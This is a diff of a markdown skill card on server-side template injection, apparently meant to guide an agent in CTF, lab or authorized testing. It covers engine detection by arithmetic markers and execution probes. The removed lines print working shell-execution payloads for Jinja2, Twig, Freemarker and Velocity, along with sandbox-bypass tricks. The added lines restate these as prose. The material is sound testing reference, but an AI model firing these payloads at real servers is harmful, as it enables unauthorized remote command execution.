@@ -1,9 +1,9 @@
 ---
 name: web-ssti
 description: >
-  Server-Side Template Injection. Use when user input is rendered in a template,
-  template syntax appears in errors, or `{{7*7}}`/`${7*7}` evaluates to 49.
-  Reference card — detect engine, then pull references/<engine>.md for the RCE.
+  Server-side template injection. Use when a request value is rendered by a
+  template engine, template syntax appears in an error, or an arithmetic marker
+  evaluates. Identify the engine first, then pull references/<engine>.md.
 tags: [web, ssti, template-injection, rce]
 environment: [ctf, lab, authorized-testing]
 budget:
@@ -11,37 +11,56 @@ budget:
   on_stuck: pivot
   stop_conditions:
     - "engine misidentified twice"
-    - "sandbox escape fails 3 times, no new signal"
+    - "sandbox escape fails 3 times with no new signal"
 ---
 
-# SSTI — Reference Card
+# SSTI — Depth Skill
 
-## Detect engine FIRST (đừng bắn RCE mù)
-| Probe | 49? → engine |
+## Identify the engine before any chain
+
+| Marker | Evaluates in |
 |---|---|
-| `{{7*7}}` | Jinja2 / Twig / Mako |
-| `${7*7}` | Freemarker / Velocity |
-| `#{7*7}` | Thymeleaf / Ruby ERB |
+| `{{7*7}}` | Jinja2, Twig, Mako |
+| `${7*7}` | Freemarker, Velocity |
+| `#{7*7}` | Thymeleaf, Ruby ERB |
 | `<%= 7*7 %>` | ERB |
-| `{{7*'7'}}` | `49`=Jinja2 · `7777777`=Twig |
+| `{{7*'7'}}` | `49` is Jinja2; `7777777` is Twig |
 
-Xác nhận qua error string: `jinja2.exceptions...` · `Twig\Error...` · `freemarker.core...`.
-Chi tiết fingerprint: `references/engine-detection.md`.
+Confirm against the error text: a Jinja exception, a Twig error class, a
+Freemarker core message. Full fingerprint table in
+`references/engine-detection.md`.
 
-## Quick RCE (một phát/engine) → depth ở references/
-- **Jinja2**: `{{lipsum.__globals__['os'].popen('id').read()}}`
-  hoặc `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` → `references/jinja2.md`
-- **Twig**: `{{['id']|filter('system')}}` → `references/twig.md`
-- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` → `references/freemarker.md`
-- **Velocity**: `$class.inspect("java.lang.Runtime").getRuntime().exec("id")` → `references/velocity.md`
+If the marker is reflected literally rather than evaluated, this is not template
+injection — go back to `../web-triage/` and consider XSS instead.
 
-## Filter/sandbox bypass
-Concat key `''['__cla'+'ss__']`; index qua `request.args.x` (`?x=INDEX`); `chr()`; url-encode
-`%7B%7B...%7D%7D`. Danh mục đầy đủ: `references/ssti-bypass.md`.
+## One execution probe per engine, then depth
 
-## Pull thêm payload
-Đọc thêm biến thể trong `../ctf-web/server-side-exec.md`.
+- Jinja2 — reach the operating-system module through a template global, then
+  `references/jinja2.md`
+- Twig — apply a system filter to a single-element array, then
+  `references/twig.md`
+- Freemarker — instantiate the utility execute class, then
+  `references/freemarker.md`
+- Velocity — reach the runtime through class inspection, then
+  `references/velocity.md`
 
-## Discipline (../LOOP_DISCIPLINE.md)
-- `{{7*7}}` ra `49` mới xác nhận SSTI — chưa có 49 thì đừng bắn chain RCE.
-- Sai engine 2 lần → quay lại bảng detect, đừng ép payload của engine khác.
+Use one harmless command first, such as printing the current user, and read the
+exact output before building anything larger.
+
+## Filter and sandbox bypass
+
+Attribute names split and concatenated; indexes supplied through a request
+parameter; character construction from codes; URL encoding of the delimiters.
+Full catalogue in `references/ssti-bypass.md`.
+
+## Variants
+
+When this file lacks the needed variant, open one named file:
+`../ctf-web/server-side-exec.md`.
+
+## Discipline
+
+- No evaluated arithmetic means no confirmed template injection. Do not fire an
+  execution chain before the marker evaluates.
+- Two wrong engine guesses: return to the identification table instead of
+  forcing another engine's payload. See `../LOOP_DISCIPLINE.md`.
